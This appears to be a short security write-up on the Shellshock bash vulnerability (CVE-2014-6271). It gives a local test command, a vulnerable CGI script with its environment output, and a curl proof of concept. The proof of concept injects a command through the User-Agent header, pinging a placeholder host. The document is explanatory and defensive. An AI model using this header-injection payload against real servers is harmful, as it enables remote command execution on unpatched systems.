CVE-2014-6271
===


[1. Overview](#overview)

[2. HTTP Header](#httpheader)

[3. Thanks](#thanks)

<a name="overview"></a>
##1. Overview
===

**CVE-2014-6271** is a real nasty one; this vulnerability is in one of those pervasive pieces of software that comes with nearly every unixy type device- the [bash](http://tiswww.case.edu/php/chet/bash/bashtop.html), the Bourne-Again SHell.  Let's test to see if your servers|workstations|internet-of-things is vulnerable:

Open a shell and paste:
```
env x='() { :;}; echo vulnerable' bash -c 'echo hello'
```

If you are not vulnerable, then the following will be shown:
```
bash: warning: x: ignoring function definition attempt
bash: error importing function definition for `x'
hello
```
If you are vulnerable, then you will see:
```
vulnerable
hello
```

If you are vulnerable you should update your device immediately.  I have a feeling that this is the kind of exploit that is going to start cropping up in a large variety of cases.  I'll try to keep this updated to detect the various methods as the situation evolves.

<a name="httpheader"></a>
##2. HTTP Header Attack
===


First POC is out- attempting to attack bash based cgi scripts; [internet wide scans](http://blog.erratasec.com/2014/09/bash-shellshock-scan-of-internet.html) have been kicked off and I expect to see this genuinely weaponized before the evening is out. 

Let's explore what is happening a little further here; a vulnerable piece of code will look something like this:

```
#!/bin/bash

echo Content-type: text/html
echo ""

/bin/cat << EOM
<HTML>
<HEAD><TITLE>File Output: /home/user1/public_html/text-file.txt </TITLE>
</HEAD>
<BODY bgcolor="#cccccc" text="#000000">
<P>
<SMALL>
<PRE>
EOM

/bin/env

CAT << EOM
</PRE>
</SMALL>
<P>
</BODY>
</HTML>
EOM
```
[source](http://www.yolinux.com/TUTORIALS/LinuxTutorialCgiShellScript.html) 

This piece of code will output something like this:
```
<HTML>
<HEAD><TITLE>File Output: /home/user1/public_html/text-file.txt </TITLE>
</HEAD>
<BODY bgcolor="#cccccc" text="#000000">
<P>
<SMALL>
<PRE>
SERVER_SIGNATURE=
Apache/2.0.40 Server at localhost Port 80


UNIQUE_ID=DErk6n8AAAEAAAblFQEAAAAD
HTTP_USER_AGENT=Mozilla/4.8 [en] (X11; U; Linux 2.4.18-27.8.0 i586)
SERVER_PORT=80
HTTP_HOST=localhost
DOCUMENT_ROOT=/var/www/html
HTTP_ACCEPT_CHARSET=iso-8859-1,*,utf-8
SCRIPT_FILENAME=/var/www/cgi-bin/env.sh
REQUEST_URI=/cgi-bin/env.sh
SCRIPT_NAME=/cgi-bin/env.sh
HTTP_CONNECTION=Keep-Alive
REMOTE_PORT=32984
PATH=/sbin:/usr/sbin:/bin:/usr/bin:/usr/X11R6/bin
PWD=/var/www/cgi-bin
SERVER_ADMIN=root@localhost
HTTP_ACCEPT_LANGUAGE=en
HTTP_ACCEPT=image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*
REMOTE_ADDR=127.0.0.1
SHLVL=1
SERVER_NAME=localhost
SERVER_SOFTWARE=Apache/2.0.40 (Red Hat Linux)
QUERY_STRING=
SERVER_ADDR=127.0.0.1
GATEWAY_INTERFACE=CGI/1.1
SERVER_PROTOCOL=HTTP/1.0
HTTP_ACCEPT_ENCODING=gzip
REQUEST_METHOD=GET
_=/bin/env
</PRE>
</SMALL>
<P>
</BODY>
</HTML>
```

[mod_cgi]() takes all of the HTTP header fields have been passes them to the bash script as environment variables for execution?  And you know that the **remote** party, the *connection originator* controls execution all of the client headers...  Really this is as simple as just using curl:

```
curl -k -H 'User-Agent: () { :;}; /bin/ping -c1  XXX.XXX.XXX.XXX' http://127.0.0.1/cgi-bin/hi
``` 

So far we have not seen or been able to get a URL encoded version of this exploit to work- however, I expect to see significant "inovation" in this space.  More to come.

<a name="thanks"></a>
##3. Thanks
===

Thanks to [@hackerplaybook](https://twitter.com/hackerplaybook) for the help testing.  Give him (and Me- [@Hectaman](https://twitter.com/hectaman)) a follow!